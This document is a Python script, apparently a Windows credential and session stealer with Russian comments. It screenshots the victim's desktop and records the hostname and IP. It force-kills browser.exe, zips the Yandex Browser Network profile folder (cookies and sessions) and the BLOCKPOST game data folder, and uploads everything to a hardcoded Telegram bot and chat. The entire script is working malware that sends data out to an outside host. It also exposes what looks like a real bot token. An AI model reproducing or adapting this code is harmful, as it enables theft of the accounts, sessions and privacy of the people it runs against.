telegram_bot_token = "6325945971:AAHwMsztDQvH_7eSN7-xnTj8D685-yVp4uc"
chat_id = "1882056354"

def get_system_info():
    system_name = socket.gethostname()
    ip = socket.gethostbyname(socket.gethostname())
    return system_name, ip

def send_message_to_telegram(message):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    data = {'chat_id': chat_id, 'text': message}
    response = requests.post(url, data=data)
    if response.status_code != 200:
        print(f"Error sending message to Telegram. Status code: {response.status_code}. Response: {response.text}")

def send_message_to_group(chat_id, screenshot, system_name, ip):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
    data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
    image_buffer = BytesIO()
    screenshot.save(image_buffer, format='JPEG')
    image_buffer.seek(0)
    files = {'photo': ('screenshot.jpg', image_buffer)}
    response = requests.post(url, data=data, files=files)

def send_file_to_telegram(file_path, file_name, chat_id):
    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
    files = {'document': (file_name, open(file_path, 'rb'))}
    data = {'chat_id': chat_id}
    response = requests.post(url, files=files, data=data)
    if response.status_code != 200:
        print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
        print(response.text)


def kill_process(process_name):
    try:
        subprocess.run(['taskkill', '/F', '/IM', process_name], check=True, capture_output=True)
        print(f"Process '{process_name}' was terminated successfully.")
        time.sleep(2)  # Небольшая задержка, чтобы процесс успел завершиться
    except subprocess.CalledProcessError as e:
        print(f"Error terminating process '{process_name}': {e}")


def create_zip_archive(source_dir, output_zip, process_to_kill=None):
    if process_to_kill:
        kill_process(process_to_kill)
    try:
        with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
            if not os.path.exists(source_dir):
                print(f"Warning: Directory not found: {source_dir}")
                return None
            for root, _, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    if "user_data" in file_path or "webview" in file_path or "temp" in file_path or "emoji" in file_path or "shortcuts-default.json" in file_path or "working" in file_path:
                        continue
                    try:
                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
                    except Exception as e:
                         print(f"Error adding file to zip: {str(e)} - {file_path}")
                         if process_to_kill:
                            print(f"Retrying archive after killing {process_to_kill}...")
                            kill_process(process_to_kill)
                            time.sleep(2) # дадим время процессу
                            return create_zip_archive(source_dir, output_zip) # Вызов архивации повторно
                         return None
        return output_zip + '.zip'
    except Exception as e:
        print(f"Error creating zip archive: {str(e)}")
        return None



def main():
    user = os.path.expanduser("~")
    blockpost_dir = os.path.join(user, "AppData", "Roaming", "BLOCKPOST")
    yandex_network_dir = r"C:\Users\Vovchik\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network"
    temp_dir = os.path.join(os.getcwd(), 'temp')

    if not os.path.exists(temp_dir):
      os.makedirs(temp_dir)

    blockpost_output_zip = os.path.join(temp_dir, 'BLOCKPOST_Data')
    yandex_output_zip = os.path.join(temp_dir, 'Yandex_Network_Data')

    system_name, ip = get_system_info()
    screenshot = ImageGrab.grab()
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    execution_path = os.path.abspath(__file__)

    send_message_to_group(chat_id, screenshot, system_name, ip)
    log_message = f"Скрипт запущен из: {execution_path}\nВремя: {current_time}"
    send_message_to_telegram(log_message)

    # Создаем и отправляем архив для BLOCKPOST
    if os.path.exists(blockpost_dir):
        log_message = f"Архивирую папку BLOCKPOST из: {blockpost_dir}"
        send_message_to_telegram(log_message)
        created_zip = create_zip_archive(blockpost_dir, blockpost_output_zip)
        if created_zip:
            send_file_to_telegram(created_zip, os.path.basename(created_zip), chat_id)
            print(f"Archive sent: {created_zip}")
        else:
            log_message = "Не удалось создать ZIP-файл для BLOCKPOST."
            send_message_to_telegram(log_message)
    else:
        log_message = "Папка 'BLOCKPOST' не найдена."
        send_message_to_telegram(log_message)

    # Создаем и отправляем архив для Yandex Network
    if os.path.exists(yandex_network_dir):
        log_message = f"Архивирую папку Yandex Network из: {yandex_network_dir}"
        send_message_to_telegram(log_message)
        created_zip = create_zip_archive(yandex_network_dir, yandex_output_zip, "browser.exe") # Передаем процесс для принудительного завершения
        if created_zip:
            send_file_to_telegram(created_zip, os.path.basename(created_zip), chat_id)
            print(f"Archive sent: {created_zip}")
        else:
            log_message = "Не удалось создать ZIP-файл для Yandex Network."
            send_message_to_telegram(log_message)
    else:
        log_message = "Папка 'Yandex Network' не найдена."
        send_message_to_telegram(log_message)

if __name__ == "__main__":
    main()
